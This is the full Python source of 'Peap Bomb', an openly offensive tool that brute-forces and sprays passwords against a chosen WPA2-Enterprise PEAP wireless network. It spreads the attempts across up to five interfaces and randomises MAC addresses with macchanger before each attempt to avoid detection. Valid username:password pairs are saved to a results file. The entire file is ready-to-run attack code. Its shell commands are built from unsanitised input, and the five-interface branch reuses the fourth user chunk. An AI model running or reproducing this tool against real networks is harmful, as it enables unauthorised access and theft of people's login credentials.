import atexit
import pathlib
import readline
import datetime
import subprocess
import os
from multiprocessing import Process

#######################################################################################
# Peap Bomb was created by Marantral infiltration.jedi@gmail.com and Abricto Security.#
# Change the driver to the appropriate one based on the equipment that you are using. #
#######################################################################################

driver = "nl80211"  # Should work for most applications, but might need to be changed.


histfile = os.path.join(os.path.expanduser("~"), ".peap_bomb_history")
try:
    readline.read_history_file(histfile)
    h_len = readline.get_current_history_length()
except FileNotFoundError:
    open(histfile, 'wb').close()
    h_len = 0
def save(prev_h_len, histfile):
    new_h_len = readline.get_current_history_length()
    readline.set_history_length(1000)
    readline.append_history_file(new_h_len - prev_h_len, histfile)
atexit.register(save, h_len, histfile)
conf = "./conf/"
res = "./Results/"
try:
    os.makedirs(conf)
except OSError:
    pass
try:
    os.makedirs(res)
except OSError:
    pass


class color:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    WHITE = '\033[97m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def connection1(password, user_list1):
    for user in user_list1:
        change_mac = "ifconfig " + face1 + " down; macchanger -r " + face1 + " >" + conf + ".garb; ifconfig " + face1 + " up"
        subprocess.call(change_mac, shell=True)

        wpa_file = """ctrl_interface=/var/run/wpa_supplicant
eapol_version=1
network={
ssid="%s"
key_mgmt=WPA-EAP
eap=PEAP
identity="%s"
password="%s"
}
""" % (ssid, user, password)

        wpa_write = open(conf + "con1.conf", "w")
        wpa_write.write(wpa_file)
        wpa_write.close()

        wpa_req = "timeout 20 wpa_supplicant -i" + face1 + " -D" + driver + " -c " + conf + "con1.conf >" + conf + "con1.res"
        try:
            subprocess.call(wpa_req, shell=True)
        except:
            pass
        clean = "ifconfig " + face1 + " down; ifconfig " + face1 + " up"
        subprocess.call(clean, shell=True)
        check1 = "cat " + conf + "con1.res | grep succeeded >" + conf + "check1.file"
        subprocess.call(check1, shell=True)
        if os.stat(conf + "check1.file").st_size == 0:
            print(
                color.RED + color.BOLD + "[*]- " + color.END + user + ":" + password + " didn't work")
        else:
            print(
                color.GREEN + color.BOLD + "[*]- " + color.BLUE + "Congrats!!! " + color.RED + user + ":" + password + color.BLUE + " can log in!!!" + color.END)
            copycreds = "echo \'" + user + ":" + password + "\' >> " + res + ssid + "_creds.txt"
            subprocess.call(copycreds, shell=True)



def connection2(password, user_list2):
    for user in user_list2:
        change_mac = "ifconfig " + face2 + " down; macchanger -r " + face2 + " >" + conf + ".garb; ifconfig " + face2 + " up"
        subprocess.call(change_mac, shell=True)
        wpa_file = """ctrl_interface=/var/run/wpa_supplicant
eapol_version=1
network={
ssid="%s"
key_mgmt=WPA-EAP
eap=PEAP
identity="%s"
password="%s"
}
""" % (ssid, user, password)

        wpa_write = open(conf + "con2.conf", "w")
        wpa_write.write(wpa_file)
        wpa_write.close()

        wpa_req = "timeout 20 wpa_supplicant -i" + face2 + " -D" + driver + " -c " + conf + "con2.conf >" + conf + "con2.res"
        try:
            subprocess.call(wpa_req, shell=True)
        except:
            pass
        clean = "ifconfig " + face2 + " down; ifconfig " + face2 + " up"
        subprocess.call(clean, shell=True)
        check1 = "cat " + conf + "con2.res | grep succeeded >" + conf + "check2.file"
        subprocess.call(check1, shell=True)
        if os.stat(conf + "check2.file").st_size == 0:
            print(
                color.RED + color.BOLD + "[*]- " + color.END + user + ":" + password + " didn't work")
        else:
            print(
                color.GREEN + color.BOLD + "[*]- " + color.BLUE + "Congrats!!! " + color.RED + user + ":" + password + color.BLUE + " can log in!!!" + color.END)
            copycreds = "echo \'" + user + ":" + password + "\' >> " + res + ssid + "_creds.txt"
            subprocess.call(copycreds, shell=True)


def connection3(password, user_list3):
    for user in user_list3:
        change_mac = "ifconfig " + face3 + " down; macchanger -r " + face3 + " >" + conf + ".garb; ifconfig " + face3 + " up"
        subprocess.call(change_mac, shell=True)

        wpa_file = """ctrl_interface=/var/run/wpa_supplicant
eapol_version=1
network={
ssid="%s"
key_mgmt=WPA-EAP
eap=PEAP
identity="%s"
password="%s"
}
""" % (ssid, user, password)

        wpa_write = open(conf + "con3.conf", "w")
        wpa_write.write(wpa_file)
        wpa_write.close()

        wpa_req = "timeout 20 wpa_supplicant -i" + face3 + " -D" + driver + " -c " + conf + "con3.conf >" + conf + "con3.res"
        try:
            subprocess.call(wpa_req, shell=True)
        except:
            pass
        clean = "ifconfig " + face3 + " down; ifconfig " + face3 + " up"
        subprocess.call(clean, shell=True)
        check1 = "cat " + conf + "con3.res | grep succeeded >" + conf + "check3.file"
        subprocess.call(check1, shell=True)
        if os.stat(conf + "check3.file").st_size == 0:
            print(
                color.RED + color.BOLD + "[*]- " + color.END + user + ":" + password + " didn't work")
        else:
            print(
                color.GREEN + color.BOLD + "[*]- " + color.BLUE + "Congrats!!! " + color.RED + user + ":" + password + color.BLUE + " can log in!!!" + color.END)
            copycreds = "echo \'" + user + ":" + password + "\' >> " + res + ssid + "_creds.txt"
            subprocess.call(copycreds, shell=True)


def connection4(password, user_list4):
    for user in user_list4:
        change_mac = "ifconfig " + face4 + " down; macchanger -r " + face4 + " >" + conf + ".garb; ifconfig " + face4 + " up"
        subprocess.call(change_mac, shell=True)

        wpa_file = """ctrl_interface=/var/run/wpa_supplicant
eapol_version=1
network={
ssid="%s"
key_mgmt=WPA-EAP
eap=PEAP
identity="%s"
password="%s"
}
""" % (ssid, user, password)

        wpa_write = open(conf + "con4.conf", "w")
        wpa_write.write(wpa_file)
        wpa_write.close()

        wpa_req = "timeout 20 wpa_supplicant -i" + face4 + " -D" + driver + " -c " + conf + "con4.conf >" + conf + "con4.res"
        try:
            subprocess.call(wpa_req, shell=True)
        except:
            pass
        clean = "ifconfig " + face4 + " down; ifconfig " + face4 + " up"
        subprocess.call(clean, shell=True)
        check1 = "cat " + conf + "con4.res | grep succeeded >" + conf + "check4.file"
        subprocess.call(check1, shell=True)
        if os.stat(conf + "check4.file").st_size == 0:
            print(
                color.RED + color.BOLD + "[*]- " + color.END + user + ":" + password + " didn't work")
        else:
            print(
                color.GREEN + color.BOLD + "[*]- " + color.BLUE + "Congrats!!! " + color.RED + user + ":" + password + color.BLUE + " can log in!!!" + color.END)
            copycreds = "echo \'" + user + ":" + password + "\' >> " + res + ssid + "_creds.txt"
            subprocess.call(copycreds, shell=True)


def connection5(password, user_list5):
    for user in user_list5:
        change_mac = "ifconfig " + face5 + " down; macchanger -r " + face5 + " >" + conf + ".garb; ifconfig " + face5 + " up"
        subprocess.call(change_mac, shell=True)

        wpa_file = """ctrl_interface=/var/run/wpa_supplicant
eapol_version=1
network={
ssid="%s"
key_mgmt=WPA-EAP
eap=PEAP
identity="%s"
password="%s"
}
""" % (ssid, user, password)

        wpa_write = open(conf + "con5.conf", "w")
        wpa_write.write(wpa_file)
        wpa_write.close()

        wpa_req = "timeout 20 wpa_supplicant -i" + face5 + " -D" + driver + " -c " + conf + "con5.conf >" + conf + "con5.res"
        try:
            subprocess.call(wpa_req, shell=True)
        except:
            pass
        clean = "ifconfig " + face5 + " down; ifconfig " + face5 + " up"
        subprocess.call(clean, shell=True)
        check1 = "cat " + conf + "con5.res | grep succeeded >" + conf + "check5.file"
        subprocess.call(check1, shell=True)
        if os.stat(conf + "check5.file").st_size == 0:
            print(
                color.RED + color.BOLD + "[*]- " + color.END + user + ":" + password + " didn't work")
        else:
            print(
                color.GREEN + color.BOLD + "[*]- " + color.BLUE + "Congrats!!! " + color.RED + user + ":" + password + color.BLUE + " can log in!!!" + color.END)
            copycreds = "echo \'" + user + ":" + password + "\' >> " + res + ssid + "_creds.txt"
            subprocess.call(copycreds, shell=True)


def bomb():
    global ssid, face1, face2, face3, face4, face5


    print(color.BLUE + r"""
          __________                          __________              ___.   
          \______   \ ____ _____  ______      \______   \ ____   _____\_ |__  
           |     ___// __ \\__  \ \____ \      |    |  _//  _ \ /     \| __ \ 
           |    |   \  ___/ / __ \|  |_> >     |    |   (  <_> )  Y Y  \ \_\ \
           |____|    \___  >____  /   __/      |______  /\____/|__|_|  /___  /
                         \/     \/|__|                \/             \/    \/                               
""" + color.RED)
    print("""
                  MW0kkOXWMMMMMMMMMMMMMWOxkxxKMMMMMMMMMMMMMMMXOkkKWM
                  N0O0kolxKWMMMMMMMMMMMWkloloKMMMMMMMMMMMMWKxook0O0N
                  kkOkoc;';lkXWMMMMMMMMWx,,':0WMMMMMMMMWXkl;,;cokOOO
                  dkxl:,'....,lxKNMWXK0Oc...'cxkOXWMNKxl,...'',:lxkd
                  xlc;,'......  .,lkOO00l....:llllol,.   .....',;clx
                  Xo,''.....     ,dKXKK0c.  .:lllll;.     ......',oX
                  M0:.....     .cOXNKKK0c   .:lllllol,      .....:0M
                  MWk,...     .o0NNXKKK0c   .:llllolll;.     ...,kWM
                  MMWd.      .d0XWNKKKK0c   .:oollollol;.     ..dWMM
                  MMMXl.    .l0KNNK00000c   .:lloddlllll;     .lXMMM
                  MMMMXdlll:ck0XNK00000Oo,'';oxkO0kollllc;;llldXMMMM
                  MMMMMMMMWOk0XWWXKKKKKK0000000KKK0xolooockWMMMMMMMM
                  MMMMMMMMNkkKNMWKKKKKKKKKKKKKKKKKKkolooocdXMMMMMMMM
                  MMMMMMMMXkOKNMNKKKKKKKKKKKKKKKKKKOdlooocoKMMMMMMMM
                  MMMMMMMMKxkKNWX000000000000000000OdllllcoKMMMMMMMM
                  MMMMMMMMXkk0XNX000000000000000000OdllllcoKMMMMMMMM
                  MMMMMMMMNkkKNMWXKKKKKKKKKKKKKKKKKOdlloocdXMMMMMMMM
                  MMMMMMMMWOx0XWWXKKKKKKKKKKKKKKKK0kollllckWMMMMMMMM
                  MMMMMMMMMXkOKNWNKKKKKKKKKKKKKKKK0xollocl0MMMMMMMMM
                  MMMMMMMMMW0xOKXNK000000000000000kollllcxWMMMMMMMMM
                  MMMMMMMMMMNOxOKXX00000000000000OxllllcoXMMMMMMMMMM
                  MMMMMMMMMMMNOk0XNXKKKKKKK0KKKK0OdlolcoKMMMMMMMMMMM
                  MMMMMMMMMMMMN0kOKXXKKKKKKKKKKKOxollcdXMMMMMMMMMMMM
                  MMMMMMMMMMMMMWXOk0KKKKKKKKKKK0xolcoONMMMMMMMMMMMMM
                  MMMMMMMMMMMMMMMWKOOkO00KKKK00xlod0NMMMMMMMMMMMMMMM
                  MMMMMMMMMMMMMMMMMWXOxxxxxxxxddkKWMMMMMMMMMMMMMMMMM
    """)

    print(color.END + """\
                            Created By Marantral The Mantroll
                         Abricto Security - abrictosecurity.com
                                     version 0.1
    """)
    print(
        color.GREEN + color.BOLD + "\nFor your convenience here are all the interfaces that seem to be wireless:" + color.RED)
    wire = "ifconfig | grep w | cut -d ':' -f 1"
    subprocess.call(wire, shell=True)
    count = input(color.BLUE + "\n\tWhat are the amount wireless interfaces that we are using?:  " + color.END)
    try:
        val = int(count)
    except ValueError:
        try:
            val = float(count)
        except ValueError:
            print(color.RED + color.BOLD + "\tERROR!!!!: THAT IS NOT A NUMBER!\n\n" + color.END)
            exit()
    if val > 5:
        print(color.RED + color.BOLD + "\tERROR!!!!: THAT IS TOO MANY INTERFACES!\n\n" + color.END)
        exit()
    if val == 5:
        face1 = input(color.BLUE + "\n\tWhat is the 1st wireless interface that we are using?:  " + color.END)
        face2 = input(color.BLUE + "\n\tWhat is the 2nd wireless interface that we are using?:  " + color.END)
        face3 = input(color.BLUE + "\n\tWhat is the 3rd wireless interface that we are using?:  " + color.END)
        face4 = input(color.BLUE + "\n\tWhat is the 4th wireless interface that we are using?:  " + color.END)
        face5 = input(color.BLUE + "\n\tWhat is the 5th wireless interface that we are using?:  " + color.END)

    if val == 4:
        face1 = input(color.BLUE + "\n\tWhat is the 1st wireless interface that we are using?:  " + color.END)
        face2 = input(color.BLUE + "\n\tWhat is the 2nd wireless interface that we are using?:  " + color.END)
        face3 = input(color.BLUE + "\n\tWhat is the 3rd wireless interface that we are using?:  " + color.END)
        face4 = input(color.BLUE + "\n\tWhat is the 4th wireless interface that we are using?:  " + color.END)

    if val == 3:
        face1 = input(color.BLUE + "\n\tWhat is the 1st wireless interface that we are using?:  " + color.END)
        face2 = input(color.BLUE + "\n\tWhat is the 2nd wireless interface that we are using?:  " + color.END)
        face3 = input(color.BLUE + "\n\tWhat is the 3rd wireless interface that we are using?:  " + color.END)

    if val == 2:
        face1 = input(color.BLUE + "\n\tWhat is the 1st wireless interface that we are using?:  " + color.END)
        face2 = input(color.BLUE + "\n\tWhat is the 2nd wireless interface that we are using?:  " + color.END)

    if val == 1:
        face1 = input(color.BLUE + "\n\tWhat is the wireless interface that we are using?:  " + color.END)

    user1 = input(color.BLUE + "\n\tWhere is the file with usernames located?:  " + color.END)
    user = pathlib.Path(user1)
    if user.exists():
        pass
    else:
        print(color.RED + color.BOLD + "\tERROR!!!!: FILE DOES NOT EXIST!\n\n" + color.END)
        exit()
    linecount = "wc -l " + user1 + " | cut -d ' ' -f 1 > " + conf + "ln"
    subprocess.call(linecount, shell=True)
    l = open(conf + "ln", 'r')
    base = l.readline().strip()
    val2 = int(base)
    split = val2 // val + 1
    spl = str(split)
    split2 = "split --lines=" + spl + " " + user1 + " " + conf + "users"
    subprocess.call(split2, shell=True)

    password1 = input(color.BLUE + "\n\tWhere is the file with possible passwords located?:  " + color.END)
    password = pathlib.Path(password1)
    if password.exists():
        pass
    else:
        print(color.RED + color.BOLD + "\tERROR!!!!: FILE DOES NOT EXIST!\n\n" + color.END)
        exit()
    passwd = open(password, "r")
    try:
        users1 = open(conf + "usersaa", "r")
    except:
        print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
        exit()
    if val >= 2:
        try:
            users2 = open(conf + "usersab", "r")
        except:
            print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
            exit()
    if val >= 3:
        try:
            users3 = open(conf + "usersac", "r")
        except:
            print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
            exit()
    if val >= 4:
        try:
            users4 = open(conf + "usersad", "r")
        except:
            print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
            exit()

    if val == 5:
        try:
            users5 = open(conf + "usersad", "r")
        except:
            print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
            exit()

    user_list1 = []
    user_list2 = []
    user_list3 = []
    user_list4 = []
    user_list5 = []
    passwords = []

    for f in users1:
        current_place = f[:-1]
        user_list1.append(current_place)

    if val >= 2:
        for f in users2:
            current_place = f[:-1]
            user_list2.append(current_place)

    if val >= 3:
        for f in users3:
            current_place = f[:-1]
            user_list3.append(current_place)

    if val >= 4:
        for f in users4:
            current_place = f[:-1]
            user_list4.append(current_place)

    if val >= 5:
        for f in users5:
            current_place = f[:-1]
            user_list5.append(current_place)

    for f in passwd:
        current_place1 = f[:-1]
        passwords.append(current_place1)

    ssid = input(color.BLUE + "\n\tWhat is the PEAP SSID that you want to target?:  " + color.END)
    clock_start = datetime.datetime.now()
    print("\n\tTry started: ", clock_start)
    if val == 1:
        clean = "rm /var/run/wpa_supplicant/" + face1 + " >" + conf + ".clean"
        try:
            subprocess.call(clean, shell=True)
        except:
            pass
        for password in passwords:

            p = Process(target=connection1, args=(password, user_list1, ))
            p.start()
            p.join()
    if val == 2:
        clean = "rm /var/run/wpa_supplicant/" + face1 + " >" + conf + ".clean"
        try:
            subprocess.call(clean, shell=True)
        except:
            pass
        clean = "rm /var/run/wpa_supplicant/" + face2 + " >" + conf + ".clean"
        try:
            subprocess.call(clean, shell=True)
        except:
            pass
        for password in passwords:

            p = Process(target=connection1, args=(password, user_list1, ))
            p2 = Process(target=connection2, args=(password, user_list2, ))
            p.start()
            p2.start()
            p.join()
            p2.join()

    if val == 3:
        clean = "rm /var/run/wpa_supplicant/" + face1 + " >" + conf + ".clean"
        try:
            subprocess.call(clean, shell=True)
        except:
            pass
        clean = "rm /var/run/wpa_supplicant/" + face2 + " >" + conf + ".clean"
        try:
            subprocess.call(clean, shell=True)
        except:
            pass
        clean = "rm /var/run/wpa_supplicant/" + face3 + " >" + conf + ".clean"
        try:
            subprocess.call(clean, shell=True)
        except:
            pass
        for password in passwords:

            p = Process(target=connection1, args=(password, user_list1, ))
            p2 = Process(target=connection2, args=(password, user_list2, ))
            p3 = Process(target=connection3, args=(password, user_list3, ))
            p.start()
            p2.start()
            p3.start()
            p.join()
            p2.join()
            p3.join()

    if val == 4:
        clean = "rm /var/run/wpa_supplicant/" + face1 + " >" + conf + ".clean"
        try:
            subprocess.call(clean, shell=True)
        except:
            pass
        clean = "rm /var/run/wpa_supplicant/" + face2 + " >" + conf + ".clean"
        try:
            subprocess.call(clean, shell=True)
        except:
            pass
        clean = "rm /var/run/wpa_supplicant/" + face3 + " >" + conf + ".clean"
        try:
            subprocess.call(clean, shell=True)
        except:
            pass
        clean = "rm /var/run/wpa_supplicant/" + face4 + " >" + conf + ".clean"
        try:
            subprocess.call(clean, shell=True)
        except:
            pass
        for password in passwords:

            p = Process(target=connection1, args=(password, user_list1, ))
            p2 = Process(target=connection2, args=(password, user_list2, ))
            p3 = Process(target=connection3, args=(password, user_list3, ))
            p4 = Process(target=connection4, args=(password, user_list4, ))
            p.start()
            p2.start()
            p3.start()
            p4.start()
            p.join()
            p2.join()
            p3.join()
            p4.join()
    if val == 5:
        clean = "rm /var/run/wpa_supplicant/" + face1 + " >" + conf + ".clean"
        try:
            subprocess.call(clean, shell=True)
        except:
            pass
        clean = "rm /var/run/wpa_supplicant/" + face2 + " >" + conf + ".clean"
        try:
            subprocess.call(clean, shell=True)
        except:
            pass
        clean = "rm /var/run/wpa_supplicant/" + face3 + " >" + conf + ".clean"
        try:
            subprocess.call(clean, shell=True)
        except:
            pass
        clean = "rm /var/run/wpa_supplicant/" + face4 + " >" + conf + ".clean"
        try:
            subprocess.call(clean, shell=True)
        except:
            pass
        clean = "rm /var/run/wpa_supplicant/" + face5 + " >" + conf + ".clean"
        try:
            subprocess.call(clean, shell=True)
        except:
            pass
        for password in passwords:

            p = Process(target=connection1, args=(password, user_list1, ))
            p2 = Process(target=connection2, args=(password, user_list2, ))
            p3 = Process(target=connection3, args=(password, user_list3, ))
            p4 = Process(target=connection4, args=(password, user_list4, ))
            p5 = Process(target=connection5, args=(password, user_list5, ))
            p.start()
            p2.start()
            p3.start()
            p4.start()
            p5.start()
            p.join()
            p2.join()
            p3.join()
            p4.join()
            p5.join()
    clock_stop = datetime.datetime.now()
    print("\n\tScan Started On: ", clock_start)
    print("\n\tScan Ended On: ", clock_stop)
    linecount2 = "wc -l " + res +  ssid + "_creds.txt | cut -d ' ' -f 1 > " + conf + "ln2"
    subprocess.call(linecount2, shell=True)
    l2 = open(conf + "ln2", 'r')
    base2 = l2.readline().strip()
    print("\n\tWe were able to get: " + color.GREEN + color.BOLD + base2 + color.END + " out of " + color.GREEN + color.BOLD + base + color.END + " possible users!!!")
    print("\n\tAll valid credentials are in: " + color.BLUE + res + ssid + "_creds.txt" + color.END)                                      

if __name__ == "__main__":
    bomb()